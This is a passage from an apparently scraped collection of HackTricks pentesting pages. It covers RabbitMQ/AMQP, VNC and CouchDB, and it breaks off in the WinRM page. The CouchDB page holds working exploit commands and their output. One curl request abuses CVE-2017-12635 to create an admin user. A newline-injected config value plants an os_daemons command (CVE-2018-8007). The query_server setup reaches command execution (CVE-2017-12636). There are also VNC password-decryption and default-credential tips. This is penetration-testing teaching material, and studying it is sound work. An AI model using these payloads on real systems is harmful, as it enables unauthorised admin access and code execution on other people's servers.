could be just a simple text message. The queue-manager software stores the messages until a receiving application connects and takes a message off the queue. The receiving application then processes the message.\nDefinition from\nhere\n.\nDefault port\n: 5672,5671\nPORT     STATE SERVICE VERSION\n5672/tcp open  amqp    RabbitMQ 3.1.5 (0-9)\nEnumeration\nManual\nimport\namqp\n#By default it uses default credentials \"guest\":\"guest\"\nconn\n=\namqp\n.\nconnection\n.\nConnection\n(\nhost\n=\n\"<IP>\"\n,\nport\n=\n5672\n,\nvirtual_host\n=\n\"/\"\n)\nconn\n.\nconnect\n()\nfor\nk\n,\nv\nin\nconn\n.\nserver_properties\n.\nitems\n():\nprint\n(\nk\n,\nv\n)\nAutomatic\nnmap\n-sV\n-Pn\n-n\n-T4\n-p\n5672\n--script\namqp-info\n<\nIP\n>\n‚Äã\nPORT     STATE SERVICE VERSION\n5672\n/tcp\nopen\namqp    RabbitMQ\n3.1\n.5\n(\n0\n-9\n)\n|\namqp-info:\n|\ncapabilities:\n|\npublisher_confirms: YES\n|\nexchange_exchange_bindings: YES\n|\nbasic.nack: YES\n|\nconsumer_cancel_notify: YES\n|\ncopyright: Copyright\n(\nC\n)\n2007\n-2013 GoPivotal, Inc.\n|\ninformation: Licensed under the MPL.  See http://www.rabbitmq.com/\n|\nplatform: Erlang/OTP\n|\nproduct: RabbitMQ\n|\nversion:\n3.1\n.5\n|\nmechanisms: PLAIN AMQPLAIN\n|\n_  locales: en_US\nOther RabbitMQ ports\nFrom\nhttps://www.rabbitmq.com/networking.html\nyou can find that\nrabbitmq uses several ports\n:\n1883, 8883\n: (\nMQTT clients\nwithout and with TLS, if the\nMQTT plugin\nis enabled.\nLearn more about how to pentest MQTT here\n.\n4369: epmd\n, a peer discovery service used by RabbitMQ nodes and CLI tools.\nLearn more about how to pentest this service here\n.\n5672, 5671\n: used by AMQP 0-9-1 and 1.0 clients without and with TLS\n15672\n:\nHTTP API\nclients,\nmanagement UI\nand\nrabbitmqadmin\n(only if the\nmanagement plugin\nis enabled).\nLearn more about how to pentest this service here\n.\n15674: STOMP-over-WebSockets clients (only if the\nWeb STOMP plugin\nis enabled)\n15675: MQTT-over-WebSockets clients (only if the\nWeb MQTT plugin\nis enabled)\n15692: Prometheus metrics (only if the\nPrometheus plugin\nis enabled)\n25672: used for inter-node and CLI tools communication (Erlang distribution server port) and is allocated from a dynamic range (limited to a single port by default, computed as AMQP port + 20000). Unless external connections on these ports are really necessary (e.g. the cluster uses\nfederation\nor CLI tools are used on machines outside the subnet), these ports should not be publicly exposed. See\nnetworking guide\nfor details.\nOnly 9 of these ports opened on the internet\n.\n35672-35682: used by CLI tools (Erlang distribution client ports) for communication with nodes and is allocated from a dynamic range (computed as server distribution port + 10000 through server distribution port + 10010). See\nnetworking guide\nfor details.\n61613, 61614:\nSTOMP clients\nwithout and with TLS (only if the\nSTOMP plugin\nis enabled). Less than 10 devices with this port open and mostly UDP for DHT nodes.\nShodan\nAMQP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5601 - Pentesting Kibana\nNext\n- Network Services Pentesting\n5800,5801,5900,5901 - Pentesting VNC\nLast modified\n6mo ago"
    },
    {
        "title": "5800,5801,5900,5901 - Pentesting VNC",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc",
        "text": "5800,5801,5900,5901 - Pentesting VNC\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIn computing,\nVirtual Network Computing\n(\nVNC\n) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.\nFrom\nwikipedia\n.\nVNC usually uses ports\n5800 or 5801 or 5900 or 5901.\nPORT    STATE SERVICE\n5900/tcp open  vnc\nEnumeration\nnmap\n-sV\n--script\nvnc-info,realvnc-auth-bypass,vnc-title\n-p\n<\nPORT\n>\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/vnc/vnc_none_auth\n‚Äã\nBrute force\n‚Äã\nConnect to vnc using Kali\nvncviewer\n[\n-passwd passwd.txt\n]\n<\nIP\n>\n::5901\nDecrypting VNC password\nDefault\npassword is stored\nin: ~/.vnc/passwd\nIf you have the VNC password and it looks encrypted (a few bytes, like if it could be and encrypted password). It is probably ciphered with 3des. You can get the clear text password using\nhttps://github.com/jeroennijhof/vncpwd\n‚Äã\nmake\nvncpwd\n<\nvnc password file\n>\nYou can do this because the password used inside 3des to encrypt the plain-text VNC passwords was reversed years ago.\nFor\nWindows\nyou can also use this tool:\nhttps://www.raymond.cc/blog/download/did/232/\nI save the tool here also for ease of access:\nvncpwd.zip\n34KB\nBinary\nShodan\nport:5900 RFB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5671,5672 - Pentesting AMQP\nNext\n- Network Services Pentesting\n5984,6984 - Pentesting CouchDB\nLast modified\n6mo ago"
    },
    {
        "title": "5984,6984 - Pentesting CouchDB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb",
        "text": "5984,6984 - Pentesting CouchDB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nCouchDB is a document-oriented database and within each document fields are stored as key-value maps. Fields can be either a simple key/value pair, list, or map.\nEach document that is stored in the database is given a document-level unique identifier (\n_id\n) as well as a revision (\n_rev\n) number for each change that is made and saved to the database.\nDefault port:\n5984(http), 6984(https)\nPORT      STATE SERVICE REASON\n5984/tcp  open  unknown syn-ack\nAutomatic Enumeration\nnmap\n-sV\n--script\ncouchdb-databases,couchdb-stats\n-p\n<\nPORT\n>\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/couchdb/couchdb_enum\nManual Enumeration\nBanner\ncurl http://IP:5984/\nThis issues a GET request to installed CouchDB instance. The reply should look something like on of the following:\n{\n\"couchdb\"\n:\n\"Welcome\"\n,\n\"version\"\n:\n\"0.10.1\"\n}\n{\n\"couchdb\"\n:\n\"Welcome\"\n,\n\"version\"\n:\n\"2.0.0\"\n,\n\"vendor\"\n:\n{\n\"name\"\n:\n\"The Apache Software Foundation\"\n}}\nNote that if accessing the root of couchdb you receive a\n401 Unauthorized\nwith something like this:\n{\"error\":\"unauthorized\",\"reason\":\"Authentication required.\"}\nyou won't be able to access\nthe banner or any other endpoint.\nInfo Enumeration\nThese are the endpoints where you can access with a\nGET\nrequest and extract some interesting info. You can find\nmore endpoints and more detailed descriptions in the couchdb documentation\n.\n/_active_tasks\nList of running tasks, including the task type, name, status and process ID.\n**\n/_all_dbs\n**Returns a list of all the databases in the CouchDB instance.\n**\n/_cluster_setup\n**Returns the status of the node or cluster, per the cluster setup wizard.\n/_db_updates\nReturns a list of all database events in the CouchDB instance. The existence of the\n_global_changes\ndatabase is required to use this endpoint.\n/_membership\nDisplays the nodes that are part of the cluster as\ncluster_nodes\n. The field\nall_nodes\ndisplays all nodes this node knows about, including the ones that are part of the cluster.\n/_scheduler/jobs\nList of replication jobs. Each job description will include source and target information, replication id, a history of recent event, and a few other things.\n/_scheduler/docs\nList of replication document states. Includes information about all the documents, even in\ncompleted\nand\nfailed\nstates. For each document it returns the document ID, the database, the replication ID, source and target, and other information.\n/_scheduler/docs/{replicator_db}\n/_scheduler/docs/{replicator_db}/{docid}\n/_node/{node-name}\nThe\n/_node/{node-name}\nendpoint can be used to confirm the Erlang node name of the server that processes the request. This is most useful when accessing\n/_node/_local\nto retrieve this information.\n/_node/{node-name}/_stats\nThe\n_stats\nresource returns a JSON object containing the statistics for the running server. The literal string\n_local\nserves as an alias for the local node name, so for all stats URLs,\n{node-name}\nmay be replaced with\n_local\n, to interact with the local node‚Äôs statistics.\n/_node/{node-name}/_system\nThe _systemresource returns a JSON object containing various system-level statistics for the running server_._ You can use __\n_local\nas {node-name} to get current node info.\n/_node/{node-name}/_restart\n/_up\nConfirms that the server is up, running, and ready to respond to requests. If\nmaintenance_mode\nis\ntrue\nor\nnolb\n, the endpoint will return a 404 response.\n**\n/_uuids\n**Requests one or more Universally Unique Identifiers (UUIDs) from the CouchDB instance.\n**\n/_reshard\n**Returns a count of completed, failed, running, stopped, and total jobs along with the state of resharding on the cluster.\nMore interesting information can be extracted as explained here:\nhttps://lzone.de/cheat-sheet/CouchDB\n‚Äã\nDatabase List\ncurl -X GET http://IP:5984/_all_dbs\nIf that request\nresponds with a 401 unauthorised\n, then you need some\nvalid credentials\nto access the database:\ncurl -X GET http://user:password@IP:5984/_all_dbs\nIn order to find valid Credentials you could\ntry to\nbruteforce the service\n.\nThis is an\nexample\nof a couchdb\nresponse\nwhen you have\nenough privileges\nto list databases (It's just a list of dbs):\n[\n\"_global_changes\"\n,\n\"_metadata\"\n,\n\"_replicator\"\n,\n\"_users\"\n,\n\"passwords\"\n,\n\"simpsons\"\n]\nDatabase Info\nYou can obtain some database info (like number of files and sizes) accessing the database name:\ncurl\nhttp://IP:5984/\n<\ndatabase\n>\ncurl\nhttp://localhost:5984/simpsons\n#Example response:\n{\n\"db_name\"\n:\n\"simpsons\"\n,\n\"update_seq\"\n:\n\"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ\"\n,\n\"sizes\"\n:\n{\n\"file\"\n:62767,\n\"external\"\n:1320,\n\"active\"\n:2466\n}\n,\n\"purge_seq\"\n:0,\n\"other\"\n:\n{\n\"data_size\"\n:1320\n}\n,\n\"doc_del_count\"\n:0,\n\"doc_count\"\n:7,\n\"disk_size\"\n:62767,\n\"disk_format_version\"\n:6,\n\"data_size\"\n:2466,\n\"compact_running\"\n:false,\n\"instance_start_time\"\n:\n\"0\"\n}\nDocument List\nList each entry inside a database\ncurl\n-X\nGET http://IP:5984/\n{\ndbname\n}\n/_all_docs\ncurl\nhttp://localhost:5984/simpsons/_all_docs\n#Example response:\n{\n\"total_rows\"\n:7,\n\"offset\"\n:0,\n\"rows\"\n:\n[\n{\n\"id\"\n:\n\"f0042ac3dc4951b51f056467a1000dd9\"\n,\n\"key\"\n:\n\"f0042ac3dc4951b51f056467a1000dd9\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a61000d86\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a61000d86\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a6100183d\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a6100183d\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-e522ebc6aca87013a89dd4b37b762bd3\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a61002980\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a61002980\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a61003068\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a61003068\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-3d2f7da6bd52442e4598f25cc2e84540\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a61003a2a\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a61003a2a\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-4446bfc0826ed3d81c9115e450844fb4\"\n}}\n,\n{\n\"id\"\n:\n\"f53679a526a868d44172c83a6100451b\"\n,\n\"key\"\n:\n\"f53679a526a868d44172c83a6100451b\"\n,\n\"value\"\n:\n{\n\"rev\"\n:\n\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"\n}}\n]}\nRead Document\nRead the content of a document inside a database:\ncurl\n-X\nGET http://IP:5984/\n{\ndbname\n}\n/\n{\nid\n}\ncurl\nhttp://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9\n#Example response:\n{\n\"_id\"\n:\n\"f0042ac3dc4951b51f056467a1000dd9\"\n,\n\"_rev\"\n:\n\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"\n,\n\"character\"\n:\n\"Homer\"\n,\n\"quote\"\n:\n\"Doh!\"\n}\nCouchDB Privilege Escalation\nCVE-2017-12635\n‚Äã\nThanks to the differences between Erlang and JavaScript JSON parsers you could\ncreate an admin user\nwith credentials\nhacktricks:hacktricks\nwith the following request:\ncurl\n-X\nPUT\n-d\n'{\"type\":\"user\",\"name\":\"hacktricks\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"hacktricks\"}'\nlocalhost:5984/_users/org.couchdb.user:hacktricks\n-H\n\"Content-Type:application/json\"\n‚Äã\nMore information about this vuln here\n.\nCouchDB RCE\nErlang Cookie\nIn the CouchDB docs, in the\ncluster set-up section\n, it talks about the different ports used by CouchDB:\nCouchDB in cluster mode uses the port\n5984\njust as standalone, but it also uses\n5986\nfor node-local APIs.\nErlang uses TCP port\n4369\n(EPMD) to find other nodes, so all servers must be able to speak to each other on this port. In an Erlang Cluster, all nodes are connected to all other nodes. A mesh.\nAnd then there‚Äôs an interesting warning:\n1536931232858\nIf we look in the process list, we can see that cookie, ‚Äúmonster‚Äù:\nwww-data@canape:/$ ps aux | grep couchdb\nroot        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb\nroot        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb\nhomer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b\nYou can\nread this section to learn how to abuse Erlangs cookies to obtain RCE\n.\nAlso, you can read some\nCanape HTB machine writeup\nlike this one\nto see and\npractice\nhow to\nexploit this vuln\n.\nSuccessful CVE-2018-8007 with local.ini write permissions\nIn writing this post, I found a new CVE had been released for CouchDB from mdsec,\nCVE-2018-8007\n. It also requires writes to the\nlocal.ini\nfile, so it isn‚Äôt a useful option for Canape. But since I‚Äôve already made it writable as root, let‚Äôs see if we can get it to work.\nStart with a clean and now writable\nlocal.ini\n(and a backup):\nroot@canape:/home/homer/etc# ls -l\ntotal 40\n-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini\n-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini\n-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk\n-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args\nWe can use curl to modify the origins in the\nlocal.ini\nfile. The vulnerability here is that if we use curl to put a new origin and then newlines, we can write additional stuff, including a new header and details. So we‚Äôll take advantage of the\n[os_daemons]\nfield, and add a process for CouchDB to try to keep running:\nwww-data@canape:/dev/shm$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins'\n-H\n\"Accept: application/json\"\n-H\n\"Content-Type: application/json\"\n-d\n\"0xdf\n\\n\\n\n[os_daemons]\n\\n\ntestdaemon = /usr/bin/touch /tmp/0xdf\"\nIn the root shell, we can see what changes:\nroot@canape:/home/homer/etc# diff local.ini local.ini.bk\n119,124d118\n<\n< [cors]\n< origins = 0xdf\n<\n< [os_daemons]\n< test_daemon = /usr/bin/touch /tmp/0xdf\nAnd yet, the file isn‚Äôt there:\nroot@canape:/home/homer/etc# ls /tmp/0xdf\nls: cannot access '/tmp/0xdf': No such file or directory\nIf we look at the processes running with ‚Äúcouchdb‚Äù in the cmdline, we see not only the line command line that gives us the cookie value we used earlier, but also\nrunsrv couchdb\n:\nroot@canape:/home/homer/bin# ps aux | grep couch\nroot        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb\nroot        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb\nhomer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi\nn/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config\nIf we kill that process, it comes right back (notice the new pid):\nroot@canape:/home/homer/etc# kill 711\nroot@canape:/home/homer/etc# ps aux | grep runsrv\nroot       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv\nAnd, on restart, runs the OS_Daemons:\nroot@canape:/home/homer/etc# ls /tmp/0xdf\n/tmp/0xdf\nSuccessful Attempt Via CVE-2017-12636 with local.ini write permissions\nCVE-2017-12636 allows for code execution through the couchdb process. However, it won‚Äôt work in this configuration.\nThere are a few POCs out there as reference:\n‚Äã\nhttps://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py\n‚Äã\n‚Äã\nhttps://www.exploit-db.com/exploits/44913/\n‚Äã\nWe‚Äôd need to write a new query_server, and then invoke that. When Canape was released, most of the POCs were for couchdb 1.x, but this box is running 2, so the query_servers path from most of the POCs doesn‚Äôt exist. That‚Äôs changed now, but we‚Äôll walk the same steps. First, get the version, and show that the 1.X path doesn‚Äôt exist:\nwww-data@canape:/var/www/git$\ncurl\nhttp://localhost:5984\n{\n\"couchdb\"\n:\n\"Welcome\"\n,\n\"version\"\n:\n\"2.0.0\"\n,\n\"vendor\"\n:\n{\n\"name\"\n:\n\"The Apache Software Foundation\"\n}}\n‚Äã\nwww-data@canape:/var/www/git$\ncurl\nhttp://0xdf:df@localhost:5984/_config/query_servers/\n{\n\"error\"\n:\n\"not_found\"\n,\n\"reason\"\n:\n\"Database does not exist.\"\n}\nUpdate with the new path for 2.0:\nwww-data@canape:/var/www/git$\ncurl\n'http://0xdf:df@localhost:5984/_membership'\n{\n\"all_nodes\"\n:\n[\n\"couchdb@localhost\"\n]\n,\n\"cluster_nodes\"\n:\n[\n\"couchdb@localhost\"\n]}\n‚Äã\nwww-data@canape:/var/www/git$\ncurl\nhttp://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers\n{\n\"coffeescript\"\n:\n\"./bin/couchjs ./share/server/main-coffee.js\"\n,\n\"javascript\"\n:\n\"./bin/couchjs ./share/server/main.js\"\n}\nFrom there, we should add a query_server and then invoke it, but we aren‚Äôt able to.\nwww-data@canape:/var/www/git$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd'\n-d\n'\"/sbin/ifconfig > /tmp/df\"'\n{\n\"error\"\n:\n\"badmatch\"\n,\n\"reason\"\n:\n\"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n\\n\n[{config_writer,save_to_file,2,\n\\n\n[{file,\n\\\"\nsrc/config_writer.erl\n\\\"\n},{line,38}]},\n\\n\n{config,handle_call,3,[{file,\n\\\"\nsrc/config.erl\n\\\"\n},{line,222}]},\n\\n\n{gen_server,try_handle_call,4,\n\\n\n[{file,\n\\\"\ngen_server.erl\n\\\"\n},{line,629}]},\n\\n\n{gen_server,handle_msg,5,\n\\n\n[{file,\n\\\"\ngen_server.erl\n\\\"\n},{line,661}]},\n\\n\n{proc_lib,init_p_do_apply,3,\n\\n\n[{file,\n\\\"\nproc_lib.erl\n\\\"\n},{line,240}]}]},\n\\n\n{gen_server,call,\n\\n\n[config,\n\\n\n{set,\n\\\"\nquery_servers\n\\\"\n,\n\\\"\ncmd\n\\\"\n,\n\\n\n\\\"\n/sbin/ifconfig > /tmp/df\n\\\"\n,true,nil}]}}}}\"\n,\n\"ref\"\n:1617834159\n}\nSome Googling shows that this is an issue with permissions. In fact, if we check with out root shell, we can see that the\nlocal.ini\nfile is not writable by anyone, let alone www-data:\nroot@canape:/home/home/etc# ls -ls local.ini\n8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini\nSo that‚Äôs a dead end for Canape. But if we want to try to get it working, we can make it readable with our root or homer access, and continue down this path. We‚Äôll make a backup of the original so we can see what changes:\nroot@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b\nroot@canape:/# chmod 666 /home/homer/etc/local.ini\nNow, back to our www-data shell:\nwww-data@canape:/dev/shm$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd'\n-d\n'\"/sbin/ifconfig > /tmp/df\"'\n\"\"\nwww-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '\"/sbin/ifconfig > /tmp/df\"'\n\"\"\nWe get back the previous value for the cmd query server, which means success. And in the root shell, we can see it worked:\nroot@canape:/home/homer/etc# diff local.ini local.ini.bk\n48c48\n< cmd = /sbin/ifconfig > /tmp/df\n---\n> cmd =\nNow, we should be able to create a db, and then a document in that db, and the request it with a view that maps our query_server to get execution.\nCreate db and document:\nwww-data@canape:/dev/shm$\ncurl\n'http://0xdf:df@localhost:5984/_all_dbs'\n[\n\"_global_changes\"\n,\n\"_metadata\"\n,\n\"_replicator\"\n,\n\"_users\"\n,\n\"god\"\n,\n\"passwords\"\n,\n\"simpsons\"\n,\n\"vultest\"\n]\nwww-data@canape:/dev/shm$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/df'\n{\n\"ok\"\n:true\n}\nwww-data@canape:/dev/shm$\ncurl\n'http://0xdf:df@localhost:5984/_all_dbs'\n[\n\"_global_changes\"\n,\n\"_metadata\"\n,\n\"_replicator\"\n,\n\"_users\"\n,\n\"df\"\n,\n\"passwords\"\n,\n\"simpsons\"\n]\n‚Äã\nwww-data@canape:/dev/shm$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/df/zero'\n-d\n'{\"_id\": \"HTP\"}'\n{\n\"ok\"\n:true,\n\"id\"\n:\n\"zero\"\n,\n\"rev\"\n:\n\"1-967a00dff5e02add41819138abb3284d\"\n}\nwww-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'\n[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"god\",\"passwords\",\"simpsons\",\"vultest\"]\nwww-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'\n{\"ok\":true}\nwww-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'\n[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"df\",\"passwords\",\"simpsons\"]\n‚Äã\nwww-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{\"_id\": \"HTP\"}'\n{\"ok\":true,\"id\":\"zero\",\"rev\":\"1-967a00dff5e02add41819138abb3284d\"}\nRequest it in a view:\nwww-data@canape:/dev/shm$\ncurl\n-X\nPUT\n'http://0xdf:df@localhost:5984/df/_design/zero'\n-d\n'{\"_id\": \"_design/zero\", \"views\": {\"anything\": {\"map\": \"\"} }, \"language\": \"cmd\"}'\n-H\n\"Content-Type: application/json\"\n‚Äã\nSummary\nwith a different payload\nShodan\nport:5984 couchdb\nReferences\n‚Äã\nhttps://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html\n‚Äã\n‚Äã\nhttps://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5800,5801,5900,5901 - Pentesting VNC\nNext\n- Network Services Pentesting\n5985,5986 - Pentesting WinRM\nLast modified\n6mo ago"
    },
    {
        "title": "5985,5986 - Pentesting WinRM",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm",
        "text": "5985,5986 - Pentesting WinRM\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWinRM\n‚Äã\nWindows Remote Management\n(WinRM) is a Microsoft protocol that\nallows remote management of Windows machines\nover HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.\nIf WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)\nThe easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:\n5985/tcp (HTTP)\n5986/tcp (HTTPS)\nIf one of these ports is open, WinRM is configured and you can try entering a remote session.\nInitiating WinRM Session\n.\nWe can configure PowerShell to work with WinRM. According to Microsoft documentation, Enable-PSRemoting is a cmdlet that configures the computer to receive PowerShell remote commands. If we have access to an elevated PowerShell prompt on the victim, we cam enable it and add any \"attackers\" as trusted hosts. We can run the following two 